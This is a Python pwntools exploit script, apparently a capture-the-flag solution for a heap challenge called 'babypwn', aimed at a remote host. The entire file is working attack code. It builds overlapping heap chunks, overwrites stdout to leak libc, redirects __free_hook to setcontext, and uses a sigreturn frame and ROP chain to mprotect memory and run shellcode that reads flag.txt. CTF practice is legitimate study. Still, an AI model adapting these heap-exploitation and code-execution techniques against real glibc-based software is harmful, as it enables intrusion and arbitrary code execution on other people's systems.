from pwn import *

context.arch='amd64'
p = remote('39.105.130.158','8888')
#p = process('./babypwn')
elf = ELF('./babypwn')
#libc = elf.libc
libc = ELF('./libc.so.6')
def add(size):
    p.sendlineafter('>>> ',str(1))
    p.sendlineafter('size:',str(size))

def delete(idx):
    p.sendlineafter('>>> ',str(2))
    p.sendlineafter('index:',str(idx))

def edit(idx,con):
    p.sendlineafter('>>> ',str(3))
    p.sendlineafter('index:',str(idx))
    p.sendafter('content:',con)

def show(idx):
    p.sendlineafter('>>> ',str(4))
    p.sendlineafter('index:',str(idx))
#context.log_level='debug'

add(0x108) #0
for i in range(7): #1-7
    add(0xF8)
for i in range(7): #8-14
    add(0x108)

for i in range(7):
    delete(14-i)  #fill [0x110] tcache
delete(0) #unsorted
for i in range(7): #0/8-13
    add(0x108)
edit(7,'A'*0xF8)
edit(7,'A'*0xF0+p64(0x810))
edit(0,'A'*0xF8+p64(0x121))
for i in range(7):
    delete(7-i) #fill [0x100] tcache
delete(0)
add(0x200)#0
add(0x20) #1
edit(1,'\x60\x47')
add(0xf0) #2
add(0xf0) #3
add(0xf0) #4 sdtout

edit(4,p64(0xfbad1800)+p64(0)*3+'\x00')
off = 0x3ed8b0
libc_base = u64(p.recvuntil('\x7f',timeout=1)[-6:]+'\x00\x00')-off
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
setcontext = libc_base + libc.sym['setcontext']+53

add(0x20) #5
delete(5)
delete(3) #1=3
edit(1,p64(free_hook))
add(0x20) #3
add(0x20) #5=free_hook
edit(5,p64(setcontext))

syscall = libc_base+libc.search(asm("syscall\nret")).next()
#syscall = libc_base + 0x00000000000d29d5
#syscall = libc_base + 0x00000000000d2975

fake_rsp = free_hook&0xfffffffffffff000
frame = SigreturnFrame()
frame.rax=0
frame.rdi=0
frame.rsi=fake_rsp
frame.rdx=0x2000
frame.rsp=fake_rsp
frame.rip=syscall


add(0x120) #6
edit(6,str(frame))
delete(6)

prdi_ret = libc_base+libc.search(asm("pop rdi\nret")).next()
prsi_ret = libc_base+libc.search(asm("pop rsi\nret")).next()
prdx_ret = libc_base+libc.search(asm("pop rdx\nret")).next()
prax_ret = libc_base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
mprotect_addr = libc_base + libc.sym['mprotect']

payload = p64(prdi_ret)+p64(fake_rsp)
payload += p64(prsi_ret)+p64(0x1000)
payload += p64(prdx_ret)+p64(7)
payload += p64(prax_ret)+p64(10)
payload += p64(syscall) #mprotect(fake_rsp,0x1000,7)
payload += p64(jmp_rsp)
payload += asm(shellcraft.open('flag.txt'))
payload += asm(shellcraft.read(3,fake_rsp+0x300,0x30))
payload += asm(shellcraft.write(1,fake_rsp+0x300,0x30))
p.send(payload)



#gdb.attach(p)
p.interactive()
